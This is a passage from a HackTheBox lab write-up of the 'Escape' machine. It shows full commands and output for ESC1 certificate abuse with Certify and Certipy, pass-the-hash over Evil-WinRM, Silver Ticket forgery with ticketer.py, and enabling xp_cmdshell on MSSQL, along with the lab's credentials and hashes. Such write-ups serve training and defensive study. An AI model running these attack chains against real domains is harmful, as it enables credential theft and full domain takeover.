vIjP2eaXmEnIkX53zUi07TuCi//0U57lkomvcwYIHX+QOc1j3bxB+LCqHtbeqZPyaDuIwc4khew/VKenATYVEPNZVw50Av08oLzq+NJ2XRhrUfUb1xRvksmreM//rtqzx53VehB1P5KWzp80v2UA+ClRPzsKd3fYO7PJQ7XZwFB3VnH81YHLSa87ayf+NPga+mvANCOtR5kGImbuHNiU2Kk39jRcp58uo2X5gCjyEfXoF3C2Ms87z+VlTtcG3qKMJ1Kq3IkXvNSq9WMTA3SB1eDN0woCvMrqur/xLaygVJmocbLfhxvz9cKUqF/dEbyavVoN5wHmAIsdZKFJSDX338ZTE2/Ej58vrsklZjF6DJAh6r581tbYwweze/rjYVVHdEKPZsUA5DshKz13NS7T+eRFwvdvi48+gcHjqoxW6Sw4lDhPiwTGro+1o4Cfe+iXDldKLSYwRv4fkeLb9CJXuKr0MNpR4vtczXZL+ybUbFt6Ve7g1R8sSibsVrxcYj6RC7BFtuFpqpzKarPRUISV5qJqOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIEEMEMAWRvJA9PIHAxV0BKYQahDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAADhAAClERgPMjAyMzA2MTAxODU1NDBaphEYDzIwMjMwNjExMDQ1NTQwWqcRGA8yMDIzMDYxNzE4NTU0MFqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  6/10/2023 11:55:40 AM
  EndTime                  :  6/10/2023 9:55:40 PM
  RenewTill                :  6/17/2023 11:55:40 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  wQwBZG8kD08gcDFXQEphBg==
  ASREP (key)              :  6E9A560FDF5290880A1C806FB5B0062C

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE

```

The last line is the NTLM hash for the administrator account.

#### With Certipy

An alternative tool to accomplish the same thing is [Certipy](https://github.com/ly4k/Certipy), which is nice because I can run it remotely from my VM. It has a `find` command that will identify the vulnerable template:

```

oxdf@hacky$ certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
...[snip]...
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms 
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

```

And `req` allows me to get the `.pfx` certificate just like I did with `Certify.exe` and `openssl` above:

```

oxdf@hacky$ certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

The `auth` command will take that certificate (`administrator.pfx`) and get the hash.

```

oxdf@hacky$ certipy auth -pfx administrator.pfx 
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

```

I noted above that there was an eight hour different in clock times. I can sync the clock with Escape using `ntpdate`:

```

oxdf@hacky$ sudo ntpdate -u sequel.htb
10 Jun 15:17:27 ntpdate[57100]: step time server 10.10.11.202 offset +28798.724561 sec

```

This typically kills my VPN session with HTB, but after reconnecting, I’m able to dump the hash:

```

oxdf@hacky$ certipy auth -pfx administrator.pfx 
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee

```

### WinRM

With the NTLM hash for administrator, I’ll connect over Evil-WinRM:

```

oxdf@hacky$ evil-winrm -i 10.10.11.202 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And grab the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
26f96af5************************

```

## Beyond Root - Silver Ticket

### Background

#### Escape “Unintended”

There’s a really interesting unintended path in Escape involving Silver Tickets. This path was detected in HTB testing, but the team and the box author decided to leave it in, as there is no good way to patch it in this scenario, and this path is assessed to be harder to spot and just as difficult as the intended path.

#### Silver Tickets

Silver Ticket are described really nicely in [this adsecurity.org post](https://adsecurity.org/?p=2011).

Typically when I want to authenticate to MSSQL, I ask for a Kerberos ticket for the service principle name (SPN). That request goes to the key distribution center (KDC) (typically the domain controller), where it looks up the user associated with that SPN, checks if the requested user is supposed to have access, and after a couple rounds of communication, returns a ticket for the user, encrypting it with the NTLM hash of the service account. Now when the user gives that ticket to the service, the service can decrypt it and use it as authentication.

In a Silver Ticket attack, all the communication with the DC is skipped. The attacker forges the service ticket (also called a TGS), and encrypts it with the service account’s NTLM.

#### Strategy for Escape

I have the NTLM hash of the sql\_svc account. The MSSQL service doesn’t have an SPN assigned (if it did, I could ask the DC to generate a service ticket that would be encrypted with sql\_svc’s hash and then modify it). Still, I don’t need the DC here. I can forge a service ticket locally using Impacket tools, encrypt it with that NTML hash of the sql\_svc, and then connect to MSSQL. This ticket won’t work on any other service, but I’ll be able to impersonate any user on MSSQL.

### Collect Information

#### Overview

To generate a Silver Ticket, I’ll use `ticketer.py`, which will need the following information:
- The NTLM hash for sql\_svc.
- The domain SID.
- The domain name.
- A SPN (it doesn’t have to be a valid SPN).
- The name of the user to impersonate.

I’ve already got the domain name of sequel.htb.

#### NTLM Hash

I’ve got the password for sql\_svc, but I need the NTLM hash. There are a bunch of online tools that will calculate that for you. That works fine for HTB, but if this were a real engagement, I wouldn’t want to put customer data into an untrusted website.

I’ll do it in Python, using `hashlib`. NTLM is an MD4 has of the UTF-16 little ending encoding of the password:

```

>>> import hashlib
>>> hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest()
b'\x14C\xec\x19\xdaM\xacO\xfc\x95;\xca\x1bW\xb4\xcf'

```

To print that nicely I’ll use `hex()`:

```

>>> hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().hex()
'1443ec19da4dac4ffc953bca1b57b4cf'

```

#### Domain SID

`Get-ADDomain` ([docs](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps)) returns information about the domain, including the SID:

```
*Evil-WinRM* PS C:\Users\sql_svc\Documents> Get-ADDomain | fl DomainSID

DomainSID : S-1-5-21-4078382237-1492182817-2568127209

```

### Silver Ticket

#### Generate

I’ll call `ticketer.py` with this information:

```

oxdf@hacky$ ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn doesnotmatter/dc.sequel.htb administrator
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sequel.htb/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache

```

It calculates the necessary information and saves the TGS in `administrator.ccache`. I’ll use the `KRB5CCNAME` environment variable to tell my system to use that service ticket to authenticate. This can be done either by running `export KRB5CCNAME=administrator.ccache` or by including `KRB5CCNAME=administrator.ccache` before each command (which I’ll use to show where it’s used).

#### Connect

With that ticket, I can authenticate to MSSQL as administrator:

```

oxdf@hacky$ KRB5CCNAME=administrator.ccache mssqlclient.py -k dc.sequel.htb
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sequel\Administrator  dbo@master)> select suser_name();
--------------------   
sequel\Administrator  

```

#### Read Flags

From this point, I can [read files](https://www.geeksforgeeks.org/reading-a-text-file-with-sql-server/#) from the box as administrator:

```

SQL (sequel\Administrator  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\users\ryan.cooper\desktop\user.txt', SINGLE_CLOB) AS Contents
BulkColumn                                
---------------------------------------   
b'358e669396e938f552b34d0ff56916dc\r\n'   

SQL (sequel\Administrator  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) AS Contents
BulkColumn                                
---------------------------------------   
b'26f96af5f692d8c0e334d4706c140e8e\r\n'   

```

#### Execution

`xp_cmdshell` is still disabled, but unlike sql\_svc, the administrator user has permissions to enable it:

```

SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
[-] ERROR(DC\SQLMOCK): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (sequel\Administrator  dbo@master)> EXECUTE sp_configure 'show advanced options', 1
[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sequel\Administrator  dbo@master)> RECONFIGURE
SQL (sequel\Administrator  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1
[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sequel\Administrator  dbo@master)> RECONFIGURE
SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc

```

The commands are still running as sql\_svc. That’s because sql\_svc is still the process running the MSSQL service. It is just able to negotiate with the OS to read file as administrator because it has that ticket.

With file read and write as administrator, I can turn that into execution as administrator. [This PayloadsAllTheThings page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---privileged-file-write) shows various methods. I [showed the DiagHub method](/2019/07/06/htb-hackback.html#arbitrary-write--diaghub--system) in HackBack, though it has since been patched. I [showed the WerTrigger method](/2021/08/21/htb-proper.html#shell-via-wertrigger) in Proper, and I believe that one still works.

Or I can use the shell through MSSQL and abuse `SeImpersonatePrivilege` with a Potato exploit (as I’ve shown many times before).